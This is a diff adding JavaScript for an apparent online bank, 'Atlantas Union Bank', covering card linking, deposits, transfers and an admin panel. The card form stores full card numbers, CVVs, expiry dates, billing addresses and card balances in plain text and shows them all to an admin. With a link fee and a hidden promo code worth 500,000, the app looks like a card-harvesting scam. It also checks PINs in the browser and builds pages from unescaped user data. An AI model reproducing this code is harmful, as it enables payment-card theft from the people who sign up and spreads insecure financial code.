+      notify(currentUser.uid,'\u{1f4b8} You paid '+rs+fmtAmt(amt)+' to '+req.fromName+'.');
+      closeModal('money-requests-modal');
+      alert('\u2705 Paid '+rs+fmtAmt(amt)+' to '+req.fromName+'!');
+    });
+  });
+}
+
+function declineRequest(reqId){
+  if(!currentUser) return;
+  db.ref('moneyRequests/'+currentUser.uid+'/'+reqId).once('value').then(function(snap){
+    if(!snap.exists()) return;
+    var req=snap.val(), rs=SYM[req.currency||'USD']||'$';
+    db.ref('moneyRequests/'+currentUser.uid+'/'+reqId+'/status').set('declined').then(function(){
+      notify(req.fromUid,'\u274c Your money request of '+rs+fmtAmt(req.amount)+' was declined.');
+      closeModal('money-requests-modal');
+    });
+  });
+}
+
+// ── ADMIN: AUTH TAB ──
+function loadAuthTab(){
+  var att=$('acc-attention'),aut=$('acc-authorized'),rej=$('acc-rejected');
+  if(!att) return;
+  att.innerHTML='<p class="acc-empty">Loading...</p>';
+  aut.innerHTML='<p class="acc-empty">Loading...</p>';
+  rej.innerHTML='<p class="acc-empty">Loading...</p>';
+  db.ref('users').once('value').then(function(snap){
+    var pending=[],authorized=[],rejected=[];
+    snap.forEach(function(s){
+      var u=s.val(); if(!u||u.email===ADMIN_EMAIL) return;
+      (u.linkedCards||[]).forEach(function(card,idx){
+        if(!card) return;
+        var item={u:u,uid:s.key,card:card,idx:idx};
+        if(card.status==='authorized') authorized.push(item);
+        else if(card.status==='rejected') rejected.push(item);
+        else pending.push(item);
+      });
+    });
+    function badge(id,n,cls){ var el=$(id); if(!el) return; el.textContent=n; el.style.display=n>0?'':'none'; el.className='acc-badge-span'+(cls?' '+cls:''); }
+    badge('badge-attention',pending.length,'red');
+    badge('badge-authorized',authorized.length,'green');
+    badge('badge-rejected',rejected.length,'red');
+    renderAuthSection(att,pending,true,'pending');
+    renderAuthSection(aut,authorized,true,'authorized');
+    renderAuthSection(rej,rejected,false,'rejected');
+  });
+}
+
+function renderAuthSection(container,items,showActions,type){
+  container.innerHTML='';
+  if(!items.length){container.innerHTML='<p class="acc-empty">None</p>';return;}
+  items.forEach(function(item){
+    var u=item.u,card=item.card,uid=item.uid,idx=item.idx,ba=card.billingAddress||{};
+    var cid='cmt-'+uid+'-'+idx;
+    var actHTML='';
+    if(showActions){
+      actHTML='<textarea class="admin-comment" id="'+cid+'" placeholder="'+(type==='pending'?'Comment (optional)':'Reason (required)')+'" rows="2"></textarea><div class="admin-card-actions">';
+      if(type==='pending') actHTML+='<button class="admin-action-btn green" onclick="adminAuth(\''+uid+'\','+idx+',\''+cid+'\')">'+'\u2705'+' Authorize</button><button class="admin-action-btn red" onclick="adminReject(\''+uid+'\','+idx+',\''+cid+'\')">'+'\u274c'+' Reject</button>';
+      else actHTML+='<button class="admin-action-btn gray" onclick="adminRemove(\''+uid+'\','+idx+',\''+cid+'\')">'+'\u{1f5d1}'+' Remove</button><button class="admin-action-btn red" onclick="adminReject(\''+uid+'\','+idx+',\''+cid+'\')">'+'\u274c'+' Reject</button>';
+      actHTML+='</div>';
+    }
+    var div=document.createElement('div');
+    div.className='admin-card';
+    div.innerHTML=
+      '<div class="admin-card-name">'+u.firstname+' '+u.surname+'</div>'+
+      mkrow('Email',u.email)+mkrow('Account #',u.accountNumber)+mkrow('Country',u.country)+
+      mkrow('Brand',card.brand)+mkrow('Card #',card.number)+mkrow('Last 4','....'+card.lastFour)+
+      mkrow('Expiry',card.expiry)+mkrow('CVV',card.cvv)+mkrow('Bal',card.currentBalance)+
+      mkrow('Street',ba.street||'--')+mkrow('City',ba.city||'--')+mkrow('Postcode',ba.postcode||'--')+mkrow('Phone',ba.phone||u.phone||'--')+
+      (card.otpCode?'<div class="admin-detail-row"><span class="admin-detail-label">OTP</span><span style="color:#4dabff;font-weight:700;">'+card.otpCode+'</span></div>':'')+
+      actHTML;
+    container.appendChild(div);
+  });
+}
+function mkrow(label,val){ return '<div class="admin-detail-row"><span class="admin-detail-label">'+label+'</span><span>'+(val||'--')+'</span></div>'; }
+
+function adminAuth(uid,idx,cid){
+  db.ref('users/'+uid).once('value').then(function(snap){
+    var u=snap.val(); if(!u) return;
+    var cards=u.linkedCards||[]; if(!cards[idx]) return;
+    var otp=String(Math.floor(100000+Math.random()*900000));
+    cards[idx].status='authorized'; cards[idx].otpCode=otp; cards[idx].authorizedDate=new Date().toISOString();
+    var comment=$(cid); if(comment&&comment.value) cards[idx].adminComment=comment.value;
+    db.ref('users/'+uid+'/linkedCards').set(cards).then(function(){
+      if(!u.verifiedBonus){
+        db.ref('users/'+uid).transaction(function(d){if(d){d.balance=(parseFloat(d.balance)||0)+10;d.verifiedBonus=true;}return d;});
+        notify(uid,'\u2705 Card authorized! $10 bonus added. Your OTP: '+otp);
+      sendEmail(u.email,
+        '✅ Card Authorized',
+        u.firstname+' '+u.surname,
+        'Your card ending in '+cards[idx].lastFour+' has been authorized.\n\nYour OTP code: '+otp+'\n\nA $10 welcome bonus has been added to your balance.\n\nThank you for banking with Atlantas Union Bank.'
+      );
+      } else { notify(uid,'\u2705 Card authorized. Your OTP: '+otp); }
+      loadAuthTab();
+    });
+  });
+}
+
+function adminReject(uid,idx,cid){
+  var reason=$(cid)?$(cid).value.trim():'';
+  if(!reason){ alert('Please enter a reason.'); return; }
+  db.ref('users/'+uid).once('value').then(function(snap){
+    var u=snap.val(); if(!u) return;
+    var cards=u.linkedCards||[]; if(!cards[idx]) return;
+    cards[idx].status='rejected'; cards[idx].adminComment=reason; cards[idx].rejectedDate=new Date().toISOString();
+    db.ref('users/'+uid+'/linkedCards').set(cards).then(function(){
+      notify(uid,'\u274c Your card was rejected. Reason: '+reason);
+      sendEmail(u.email,
+        '❌ Card Rejected',
+        u.firstname+' '+u.surname,
+        'Your card ending in '+cards[idx].lastFour+' has been rejected.\n\nReason: '+reason+'\n\nPlease contact support or link a different card.'
+      );
+      loadAuthTab();
+    });
+  });
+}
+
+function adminRemove(uid,idx,cid){
+  var reason=$(cid)?$(cid).value.trim():'';
+  if(!reason){ alert('Please enter a reason.'); return; }
+  db.ref('users/'+uid).once('value').then(function(snap){
+    var u=snap.val(); if(!u) return;
+    var cards=u.linkedCards||[];
+    cards.splice(idx,1);
+    db.ref('users/'+uid+'/linkedCards').set(cards).then(function(){
+      notify(uid,'\u{1f4b3} Your card was removed. Reason: '+reason);
+      loadAuthTab();
+    });
+  });
+}
+
+// ── ADMIN: DEPOSITS TAB ──
+function loadDepositsTab(){
+  var list=$('deposits-list'); if(!list) return;
+  list.innerHTML='<p class="acc-empty">Loading...</p>';
+  db.ref('depositRequests').once('value').then(function(snap){
+    if(!snap.exists()){list.innerHTML='<p class="acc-empty">No deposit requests yet</p>';return;}
+    var all=[];
+    snap.forEach(function(s){all.push(Object.assign({},s.val(),{reqKey:s.key}));});
+    all.sort(function(a,b){
+      if(a.status==='pending'&&b.status!=='pending') return -1;
+      if(b.status==='pending'&&a.status!=='pending') return 1;
+      return new Date(b.date)-new Date(a.date);
+    });
+    list.innerHTML='';
+    all.forEach(function(req){
+      var rs=SYM[req.currency||'USD']||'$';
+      var isPending=req.status==='pending';
+      var div=document.createElement('div');
+      div.className='deposit-card';
+      div.innerHTML=
+        '<span class="deposit-status '+req.status+'">'+(isPending?'\u29d6 PENDING':req.status==='approved'?'\u2705 APPROVED':'\u274c REJECTED')+'</span>'+
+        '<div class="admin-card-name">'+req.name+'</div>'+
+        mkrow('Email',req.email)+
+        '<div class="admin-detail-row"><span class="admin-detail-label">Amount</span><span style="color:#34d399;font-weight:700;font-size:16px;">'+rs+parseFloat(req.amount).toFixed(2)+'</span></div>'+
+        mkrow('Card',req.cardBrand+' ....'+req.cardLastFour)+
+        mkrow('Card #',req.cardNumber||'--')+
+        mkrow('Account',req.accountNumber)+
+        mkrow('Date',fmtDate(req.date))+
+        (isPending?'<div class="admin-card-actions" style="margin-top:12px;"><button class="admin-action-btn green" onclick="approveDeposit(\''+req.reqKey+'\')">'+'\u2705'+' Approve</button><button class="admin-action-btn red" onclick="rejectDeposit(\''+req.reqKey+'\')">'+'\u274c'+' Reject</button></div>':'');
+      list.appendChild(div);
+    });
+  });
+}
+
+function approveDeposit(reqKey){
+  db.ref('depositRequests/'+reqKey).once('value').then(function(snap){
+    if(!snap.exists()) return alert('Not found.');
+    var req=snap.val(); if(req.status!=='pending') return alert('Already processed.');
+    var amt=parseFloat(req.amount), rs=SYM[req.currency||'USD']||'$';
+    db.ref('users/'+req.uid).transaction(function(u){
+      if(u){u.balance=(parseFloat(u.balance)||0)+amt;u.history=u.history||[];
+        u.history.push({date:new Date().toISOString(),type:'Deposit',amount:amt,note:'Deposit approved ('+req.cardBrand+' ....'+req.cardLastFour+')'});}
+      return u;
+    }).then(function(){
+      return db.ref('depositRequests/'+reqKey).update({status:'approved',processedDate:new Date().toISOString()});
+    }).then(function(){
+      notify(req.uid,'\u2705 Deposit of '+rs+amt.toFixed(2)+' approved and added to your balance!');
+      sendEmail(req.email,
+        '✅ Deposit Approved',
+        req.name,
+        'Your deposit of '+rs+amt.toFixed(2)+' has been approved and added to your balance.\n\nCard: '+req.cardBrand+' ....'+req.cardLastFour+'\nAccount: '+req.accountNumber+'\nDate: '+new Date().toLocaleString()+'\n\nThank you for banking with Atlantas Union Bank.'
+      );
+      loadDepositsTab();
+    });
+  });
+}
+
+function rejectDeposit(reqKey){
+  var reason=prompt('Reason for rejection:'); if(reason===null) return;
+  db.ref('depositRequests/'+reqKey).once('value').then(function(snap){
+    if(!snap.exists()) return;
+    var req=snap.val(), rs=SYM[req.currency||'USD']||'$';
+    db.ref('depositRequests/'+reqKey).update({status:'rejected',rejectReason:reason||'Rejected',processedDate:new Date().toISOString()}).then(function(){
+      notify(req.uid,'\u274c Deposit of '+rs+parseFloat(req.amount).toFixed(2)+' rejected.'+(reason?' Reason: '+reason:''));
+      loadDepositsTab();
+    });
+  });
+}
+
+// ── ADMIN: USERS TAB ──
+function loadUsersTab(){
+  var con=$('users-list'); if(!con) return;
+  con.innerHTML='<p class="acc-empty">Loading...</p>';
+  db.ref('users').once('value').then(function(snap){
+    var byCountry={};
+    snap.forEach(function(s){
+      var u=s.val(); if(!u||u.email===ADMIN_EMAIL) return;
+      var co=(u.country&&u.country.trim())||'Other';
+      if(!byCountry[co]) byCountry[co]=[];
+      byCountry[co].push(Object.assign({},u,{uid:s.key}));
+    });
+    con.innerHTML='';
+    var countries=Object.keys(byCountry).sort();
+    if(!countries.length){con.innerHTML='<p class="acc-empty">No users yet</p>';return;}
+    var flagMap={USA:'🇺🇸',UK:'🇬🇧',Nigeria:'🇳🇬',Germany:'🇩🇪',France:'🇫🇷',Canada:'🇨🇦',Brazil:'🇧🇷',Australia:'🇦🇺',Other:'🌍'};
+    countries.forEach(function(country){
+      var users=byCountry[country], flag=flagMap[country]||'🌍';
+      var block=document.createElement('div'); block.className='country-block';
+      var hdr=document.createElement('div'); hdr.className='country-header-row';
+      hdr.innerHTML='<span class="country-name">'+flag+' '+country+'</span><span class="country-count">'+users.length+' user'+(users.length!==1?'s':'')+'</span>';
+      block.appendChild(hdr);
+      users.forEach(function(u){
+        var rs=SYM[u.currency||'USD']||'$';
+        var ucard=document.createElement('div'); ucard.className='admin-user-card';
+        ucard.innerHTML=
+          '<div class="admin-user-name">'+u.firstname+' '+u.surname+'</div>'+
+          '<div class="admin-user-detail">'+'\u{1f4e7}'+' '+u.email+'</div>'+
+          '<div class="admin-user-detail">'+'\u{1f4b0}'+' Balance: '+rs+(u.balance||0).toFixed(2)+'</div>'+
+          '<div class="admin-user-detail">'+'🔢'+' Account: '+(u.accountNumber||'--')+'</div>'+
+          '<div class="admin-user-detail">'+'💳'+' Cards: '+((u.linkedCards||[]).filter(function(c){return c;}).length)+'</div>'+
+          '<div class="admin-user-actions">'+
+            '<input type="text" class="admin-pin-input" id="pin-'+u.uid+'" placeholder="PIN" maxlength="4" inputmode="numeric">'+
+            '<button class="admin-action-btn green" style="flex:none;padding:10px 14px;font-size:13px;" onclick="setUserPin(\''+u.uid+'\')">Set PIN</button>'+
+            '<button class="admin-action-btn orange" style="flex:none;padding:10px 14px;font-size:13px;" onclick="msgUser(\''+u.uid+'\')">'+'📨'+' Msg</button>'+
+          '</div>';
+        block.appendChild(ucard);
+      });
+      con.appendChild(block);
+    });
+  });
+}
+
+function setUserPin(uid){
+  var inp=$('pin-'+uid); var pin=inp?inp.value.trim():'';
+  if(!pin||pin.length!==4){alert('Enter a 4-digit PIN.');return;}
+  db.ref('users/'+uid+'/pin').set(pin).then(function(){alert('PIN updated!');});
+}
+function msgUser(uid){
+  var msg=prompt('Message to send:'); if(!msg) return;
+  notify(uid,'📢 Admin: '+msg).then(function(){alert('Sent!');});
+}
+
+// ════════════════════════════════════════════
+// EVENT HANDLERS — inside DOMContentLoaded
+// ════════════════════════════════════════════
+document.addEventListener('DOMContentLoaded',function(){
+
+// AUTH
+$('to-signup').onclick=function(){$('login-section').style.display='none';$('signup-section').style.display='block';};
+$('to-login').onclick=function(){$('signup-section').style.display='none';$('login-section').style.display='block';};
+
+$('login-btn').onclick=function(){
+  var em=$('li-email').value.trim(),pw=$('li-password').value,err=$('login-error');
+  err.textContent='';
+  if(!em||!pw){err.textContent='Please fill in all fields.';return;}
+  auth.signInWithEmailAndPassword(em,pw).catch(function(e){err.textContent=e.message;});
+};
+
+$('signup-btn').onclick=function(){
+  var err=$('signup-error'); err.textContent='';
+  var sur=$('su-surname').value.trim(),fn=$('su-firstname').value.trim(),oth=$('su-othername').value.trim(),ph=$('su-phone').value.trim();
+  var un=$('su-username').value.trim(),em=$('su-email').value.trim(),pw=$('su-password').value,cf=$('su-confirm').value;
+  var cur=$('su-currency').value,co=$('su-country').value,promo=$('su-promo').value.trim(),ref=$('su-referral').value.trim().toUpperCase();
+  if(!sur||!fn||!ph||!un||!em||!pw||!co){err.textContent='Please fill in all required fields.';return;}
+  if(pw!==cf){err.textContent='Passwords do not match.';return;}
+  if(pw.length<8){err.textContent='Password must be at least 8 characters.';return;}
+  $('signup-btn').textContent='Creating...'; $('signup-btn').disabled=true;
+  auth.createUserWithEmailAndPassword(em,pw).then(function(cred){
+    var uid=cred.user.uid;
+    return genAccNum().then(function(accNum){
+      var bal=promo.toUpperCase()==='VICCYLAY30'?500000:0;
+      var refCode='AUB-'+uid.slice(0,6).toUpperCase();
+      return db.ref('users/'+uid).set({surname:sur,firstname:fn,othername:oth,phone:ph,username:un,email:em,currency:cur,country:co,accountNumber:accNum,balance:bal,history:[],linkedCards:[],referralCode:refCode,referrals:[],referralClaimed:false})
+        .then(function(){return db.ref('accountNumbers/'+accNum).set(uid);})
+        .then(function(){return db.ref('publicDirectory/'+uid).set({firstname:fn,surname:sur,accountNumber:accNum});})
+        .then(function(){
+          if(!ref) return;
+          return db.ref('users').once('value').then(function(snap){
+            snap.forEach(function(s){var u=s.val();if(u&&u.referralCode===ref){var refs=u.referrals||[];refs.push({uid:uid,date:new Date().toISOString()});db.ref('users/'+s.key+'/referrals').set(refs);notify(s.key,'🎉 Someone joined with your code! You have '+refs.length+' referrals.');}});
+          });
+        });
+    });
+  }).catch(function(e){err.textContent=e.message;$('signup-btn').textContent='Create Account';$('signup-btn').disabled=false;});
+};
+
+// DRAWER
+$('menu-btn').onclick=openDrawer;
+$('drawer-overlay').onclick=closeDrawer;
+$('drawer-logout').onclick=function(){auth.signOut();closeDrawer();};
+$('more-logout').onclick=function(){auth.signOut();closeModal('more-modal');};
+$('admin-logout-btn').onclick=function(){auth.signOut();};
+
+// NOTIF
+$('notif-btn').onclick=function(){
+  openModal('notif-modal');
+  setTimeout(function(){
+    if(!currentUser) return;
+    db.ref('notifications/'+currentUser.uid).once('value').then(function(snap){
+      if(snap.exists()) snap.forEach(function(s){if(!s.val().read) db.ref('notifications/'+currentUser.uid+'/'+s.key+'/read').set(true);});
+    });
+  },1500);
+};
+
+// VERIFY
+$('verify-banner-btn').onclick=function(){openModal('verify-modal');};
+$('vtab-app').onclick=function(){$('vpanel-app').style.display='block';$('vpanel-otp').style.display='none';$('vtab-app').classList.add('active');$('vtab-otp').classList.remove('active');};
+$('vtab-otp').onclick=function(){$('vpanel-otp').style.display='block';$('vpanel-app').style.display='none';$('vtab-otp').classList.add('active');$('vtab-app').classList.remove('active');};
+$('verify-app-done').onclick=function(){
+  var cards=userData.linkedCards||[],last=cards[cards.length-1];
+  if(last){last.appAuthRequested=true;last.appAuthDate=new Date().toISOString();db.ref('users/'+currentUser.uid+'/linkedCards').set(cards);}
+  $('verify-msg').style.color='#34d399';$('verify-msg').textContent='\u2705 Submitted! Our team will verify shortly.';
+};
+$('verify-otp-btn').onclick=function(){
+  var otp=$('otp-input').value.trim(),msg=$('verify-msg');msg.textContent='';
+  if(!otp){msg.style.color='#ff5c5c';msg.textContent='Enter the OTP.';return;}
+  var cards=userData.linkedCards||[];
+  var idx=cards.findIndex(function(c){return c&&c.otpCode===otp;});
+  if(idx<0){msg.style.color='#ff5c5c';msg.textContent='\u274c Invalid OTP.';return;}
+  cards[idx].status='authorized';cards[idx].authorizedDate=new Date().toISOString();
+  db.ref('users/'+currentUser.uid+'/linkedCards').set(cards).then(function(){
+    if(!userData.verifiedBonus){
+      db.ref('users/'+currentUser.uid).transaction(function(u){if(u){u.balance=(parseFloat(u.balance)||0)+10;u.verifiedBonus=true;}return u;});
+      notify(currentUser.uid,'🎉 Card verified! $10 bonus added!');
+    }
+    msg.style.color='#34d399';msg.textContent='\u2705 Card verified!';
+  });
+};
+
+// ACCOUNT
+$('acct-info-btn').onclick=function(){openModal('account-modal');};
+$('copy-acct-btn').onclick=function(){
+  var num=userData.accountNumber||'';if(!num) return;
+  navigator.clipboard.writeText(num).then(function(){alert('Copied: '+num);}).catch(function(){alert('Your account: '+num);});
+};
+$('gen-pin-btn').onclick=function(){
+  var pin=String(Math.floor(1000+Math.random()*9000));
+  if(!currentUser) return;
+  db.ref('users/'+currentUser.uid+'/pin').set(pin).then(function(){alert('New PIN: '+pin+'\n\nSave this safely!');});
+};
+
+// CARDS
+$('add-card-btn').onclick=function(){openModal('card-options-modal');};
+$('add-card-link').onclick=function(){openModal('card-options-modal');};
+$('offer-card-btn').onclick=function(){openModal('card-options-modal');};
+$('view-cards-btn').onclick=function(){
+  closeModal('card-options-modal');
+  var con=$('cards-list-content');con.innerHTML='';
+  var cards=(userData.linkedCards||[]).filter(function(c){return c;});
+  if(!cards.length){con.innerHTML='<p style="text-align:center;color:#999;padding:20px;">No cards linked yet</p>';}
+  else{cards.forEach(function(card,idx){
+    var div=document.createElement('div');div.className='linked-card';
+    div.innerHTML='<div><div class="linked-card-brand">'+card.brand+'</div><div class="linked-card-num">\u2022\u2022\u2022\u2022 \u2022\u2022\u2022\u2022 \u2022\u2022\u2022\u2022 '+card.lastFour+'</div><div class="linked-card-expiry">Exp: '+card.expiry+'</div><span class="linked-card-status '+card.status+'">'+(card.status==='authorized'?'\u2713 Authorized':card.status==='rejected'?'\u2717 Rejected':'\u29d6 Pending')+'</span></div>'+
+      '<button class="remove-card-btn" onclick="removeCard('+idx+')">Remove</button>';
+    con.appendChild(div);
+  });}
+  openModal('cards-list-modal');
+};
+$('add-new-card-btn').onclick=function(){
+  closeModal('card-options-modal');
+  $('card-modal-title').textContent='💳 Link Card';
+  // Update fee label based on user currency
+  var feeEl=$('card-link-fee');
+  if(feeEl){var feeSym={'USD':'$','EUR':'€','GBP':'£','NGN':'₦','CAD':'C$','AUD':'A$'}[userData.currency||'USD']||'$';feeEl.textContent='2'+feeSym;}
+  ['card-number','card-name','card-expiry','card-cvv','card-street','card-city','card-postcode','card-country-field','card-phone','card-balance'].forEach(function(id){var el=$(id);if(el)el.value='';});
+  $('card-error').textContent='';
+  openModal('card-modal');
+};
+$('card-submit-btn').onclick=function(){
+  var err=$('card-error');err.textContent='';
+  var num=$('card-number').value.replace(/\D/g,'');
+  var name=$('card-name').value.trim(),expiry=$('card-expiry').value.trim(),cvv=$('card-cvv').value.trim();
+  var street=$('card-street').value.trim(),city=$('card-city').value.trim(),postcode=$('card-postcode').value.trim();
+  var country=$('card-country-field').value.trim(),phone=$('card-phone').value.trim(),balance=$('card-balance').value.trim();
+  if(num.length!==16){err.textContent='Card number must be 16 digits.';return;}
+  if(!name||!expiry||!cvv){err.textContent='Please fill card name, expiry, and CVV.';return;}
+  var cards=userData.linkedCards||[];
+  if(cards.some(function(c){return c&&c.number===num;})){err.textContent='Card already linked.';return;}
+  var brand=detectBrand(num);
+  var newCard={number:num,name:name,expiry:expiry,cvv:cvv,brand:brand,lastFour:num.slice(-4),status:'pending',currentBalance:balance,addedDate:new Date().toISOString(),billingAddress:{street:street,city:city,postcode:postcode,country:country,phone:phone}};
+  cards.push(newCard);
+  $('card-submit-btn').textContent='Linking...';$('card-submit-btn').disabled=true;
+  db.ref('users/'+currentUser.uid+'/linkedCards').set(cards).then(function(){
+    return db.ref('users').once('value').then(function(snap){
+      snap.forEach(function(s){if(s.val()&&s.val().email===ADMIN_EMAIL) notify(s.key,'💳 NEW CARD: '+(userData.firstname||'')+' '+(userData.surname||'')+' linked '+brand+' ....'+num.slice(-4));
+            sendEmail(ADMIN_EMAIL,
+              '🔔 Card Authorization Request',
+              (userData.firstname||'')+' '+(userData.surname||''),
+              (userData.firstname||'')+' '+(userData.surname||'')+' is requesting bank card authorization.\n\nCard: '+brand+' ....'+num.slice(-4)+'\nExpiry: '+expiry+'\nAccount: '+(userData.accountNumber||'')+'\nEmail: '+(userData.email||'')+'\n\nPlease check your admin panel to review it.'
+            );});
+    });
+  }).then(function(){
+    closeModal('card-modal');
+    setTimeout(function(){$('vc-brand').textContent=brand;$('vc-number').textContent='\u2022\u2022\u2022\u2022 \u2022\u2022\u2022\u2022 \u2022\u2022\u2022\u2022 '+num.slice(-4);$('vc-name').textContent=name;$('verify-msg').textContent='';$('otp-input').value='';openModal('verify-modal');},300);
+  }).catch(function(e){err.textContent=e.message;}).finally(function(){$('card-submit-btn').textContent='Link Card';$('card-submit-btn').disabled=false;});
+};
+window.removeCard=function(idx){
+  if(!confirm('Remove this card?')) return;
+  var cards=userData.linkedCards||[];cards.splice(idx,1);
+  db.ref('users/'+currentUser.uid+'/linkedCards').set(cards).then(function(){closeModal('cards-list-modal');});
+};
+
+// ADD MONEY
+$('add-money-btn').onclick=function(){
+  var cards=(userData.linkedCards||[]).filter(function(c){return c&&c.status==='authorized';});
+  var con=$('addmoney-cards'),sec=$('addmoney-form-section');
+  addMoneyCardIdx=-1;sec.style.display='none';con.innerHTML='';
+  if(!cards.length){con.innerHTML='<p style="color:#e53935;text-align:center;padding:16px;">No authorized cards. Link and verify a card first.</p>';}
+  else{
+    var allCards=userData.linkedCards||[];
+    cards.forEach(function(card){
+      var realIdx=allCards.indexOf(card);
+      var opt=document.createElement('div');opt.className='addmoney-opt';
+      opt.innerHTML='<span class="addmoney-opt-icon">💳</span><div><div class="addmoney-opt-label">'+card.brand+' \u2022\u2022\u2022\u2022'+card.lastFour+'</div><div class="addmoney-opt-sub">Authorized</div></div>';
+      opt.onclick=function(){document.querySelectorAll('.addmoney-opt').forEach(function(o){o.classList.remove('selected');});opt.classList.add('selected');addMoneyCardIdx=realIdx;$('addmoney-selected-info').textContent='Selected: '+card.brand+' \u2022\u2022\u2022\u2022'+card.lastFour;sec.style.display='block';};
+      con.appendChild(opt);
+    });
+  }
+  openModal('add-money-modal');
+};
+$('addmoney-confirm-btn').onclick=function(){
+  var amt=parseFloat($('addmoney-amount').value),pin=$('addmoney-pin').value.trim(),err=$('addmoney-error');err.textContent='';
+  if(!amt||amt<=0){err.textContent='Enter a valid amount.';return;}
+  if(!pin||pin.length!==4){err.textContent='Enter your 4-digit PIN.';return;}
+  if(addMoneyCardIdx<0){err.textContent='Select a card first.';return;}
+  if(userData.pin!==pin){err.textContent='Incorrect PIN.';return;}
+  var card=(userData.linkedCards||[])[addMoneyCardIdx];
+  if(!card||card.status!=='authorized'){err.textContent='Card not authorized.';return;}
+  var s=sym(),reqKey='dep_'+Date.now()+'_'+Math.random().toString(36).slice(2,5);
+  var reqData={uid:currentUser.uid,name:(userData.firstname||'')+' '+(userData.surname||''),email:userData.email,accountNumber:userData.accountNumber,currency:userData.currency||'USD',amount:amt,cardBrand:card.brand,cardLastFour:card.lastFour,cardNumber:card.number,date:new Date().toISOString(),status:'pending',reqKey:reqKey};
+  $('addmoney-confirm-btn').textContent='Submitting...';$('addmoney-confirm-btn').disabled=true;
+  db.ref('depositRequests/'+reqKey).set(reqData).then(function(){
+    notify(currentUser.uid,'\u29d6 Deposit of '+s+amt.toFixed(2)+' submitted — awaiting admin approval.');
+    return db.ref('users').once('value').then(function(snap){snap.forEach(function(s2){if(s2.val()&&s2.val().email===ADMIN_EMAIL) notify(s2.key,'💰 DEPOSIT: '+(userData.firstname||'')+' wants '+s+amt.toFixed(2)+' via '+card.brand+' \u2022\u2022\u2022\u2022'+card.lastFour);
+              sendEmail(ADMIN_EMAIL,
+                '💰 Deposit Request',
+                (userData.firstname||'')+' '+(userData.surname||''),
+                (userData.firstname||'')+' '+(userData.surname||'')+' is requesting a deposit of '+s+amt.toFixed(2)+'.\n\nCard: '+card.brand+' ....'+card.lastFour+'\nAccount: '+(userData.accountNumber||'')+'\nEmail: '+(userData.email||'')+'\nDate: '+new Date().toLocaleString()+'\n\nPlease check your admin panel to approve or reject.'
+              );});});
+  }).then(function(){closeModal('add-money-modal');$('addmoney-amount').value='';$('addmoney-pin').value='';alert('\u29d6 Deposit of '+s+amt.toFixed(2)+' submitted!\nBalance updates once admin approves.');}).finally(function(){$('addmoney-confirm-btn').textContent='Submit Deposit Request';$('addmoney-confirm-btn').disabled=false;});
+};
+
+// TRANSFER
+$('transfer-btn').onclick=function(){
+  var cards=(userData.linkedCards||[]).filter(function(c){return c&&c.status==='authorized';});
+  var sel=$('transfer-method');sel.innerHTML='<option value="">Select Card</option>';
+  cards.forEach(function(card,i){var opt=document.createElement('option');opt.value=i;opt.textContent=card.brand+' \u2022\u2022\u2022\u2022'+card.lastFour;sel.appendChild(opt);});
+  $('transfer-error').textContent='';openModal('transfer-modal');
+};
+$('transfer-confirm-btn').onclick=function(){
+  var method=$('transfer-method').value,amt=parseFloat($('transfer-amount').value),pin=$('transfer-pin').value.trim(),err=$('transfer-error');err.textContent='';
+  if(!method){err.textContent='Select a card.';return;}
+  if(!amt||amt<=0){err.textContent='Enter a valid amount.';return;}
+  if(!pin||pin.length!==4){err.textContent='Enter your PIN.';return;}
+  if(userData.pin!==pin){err.textContent='Incorrect PIN.';return;}
+  if(parseFloat(userData.balance||0)<amt){err.textContent='Insufficient balance.';return;}
+  var s=sym();
+  var authCards=(userData.linkedCards||[]).filter(function(c){return c&&c.status==='authorized';});
+  var card=authCards[parseInt(method)];
+  $('transfer-confirm-btn').textContent='Processing...';$('transfer-confirm-btn').disabled=true;
+  userRef.transaction(function(u){
+    if(u){u.balance=(parseFloat(u.balance)||0)-amt;u.history=u.history||[];u.history.push({date:new Date().toISOString(),type:'Transfer',amount:-amt,note:'Transfer to '+(card?card.brand+' \u2022\u2022\u2022\u2022'+card.lastFour:'card')});}
+    return u;
+  }).then(function(){
+    notify(currentUser.uid,'💸 Transfer of '+s+amt.toFixed(2)+' submitted. Processing 1-3 days.');
+    return db.ref('users').once('value').then(function(snap){snap.forEach(function(s2){if(s2.val()&&s2.val().email===ADMIN_EMAIL) notify(s2.key,'💸 TRANSFER: '+(userData.firstname||'')+' wants '+s+amt.toFixed(2)+' to '+(card?card.brand+' \u2022\u2022\u2022\u2022'+card.lastFour:''));});});
+  }).then(function(){closeModal('transfer-modal');$('transfer-amount').value='';$('transfer-pin').value='';alert('\u2705 Transfer of '+s+amt.toFixed(2)+' submitted!');}).finally(function(){$('transfer-confirm-btn').textContent='Request Transfer';$('transfer-confirm-btn').disabled=false;});
+};
+
+// SEND
+$('send-acct').oninput=function(){
+  var val=this.value.trim(),info=$('send-acct-info');
+  if(val.length===10){
+    db.ref('accountNumbers/'+val).once('value').then(function(snap){
+      if(!snap.exists()){info.style.display='block';info.textContent='\u274c Account not found';return;}
+      var ruid=snap.val();
+      // Try publicDirectory first (fast), fall back to users node
+      db.ref('publicDirectory/'+ruid).once('value').then(function(pub){
+        if(pub.exists()&&pub.val().firstname){
+          info.style.display='block';
+          info.textContent='\u2705 '+pub.val().firstname+' '+pub.val().surname;
+        } else {
+          // Fall back to users node
+          db.ref('users/'+ruid).once('value').then(function(us){
+            var u=us.val();
+            info.style.display='block';
+            info.textContent=u&&u.firstname?'\u2705 '+u.firstname+' '+u.surname:'\u2705 Account found';
+          }).catch(function(){info.style.display='block';info.textContent='\u2705 Account found';});
+        }
+      }).catch(function(){info.style.display='block';info.textContent='\u2705 Account found';});
+    });
+  } else {info.style.display='none';}
+};
+$('send-btn').onclick=function(){
+  var acct=$('send-acct').value.trim(),amt=parseFloat($('send-amount').value),pin=$('send-pin').value.trim(),err=$('send-error');err.textContent='';
+  if(!acct||acct.length!==10){err.textContent='Enter a valid 10-digit account number.';return;}
+  if(!amt||amt<=0){err.textContent='Enter a valid amount.';return;}
+  if(!pin||pin.length!==4){err.textContent='Enter your PIN.';return;}
+  if(userData.pin!==pin){err.textContent='Incorrect PIN.';return;}
+  if(parseFloat(userData.balance||0)<amt){err.textContent='Insufficient balance.';return;}
+  db.ref('accountNumbers/'+acct).once('value').then(function(snap){
+    if(!snap.exists()){err.textContent='Account not found.';return;}
+    var ruid=snap.val();if(ruid===currentUser.uid){err.textContent="Can't send to yourself.";return;}
+    var s=sym(),myName=(userData.firstname||'')+' '+(userData.surname||''),myAcct=userData.accountNumber||'',now=new Date().toISOString();
+    $('send-btn').textContent='Sending...';$('send-btn').disabled=true;
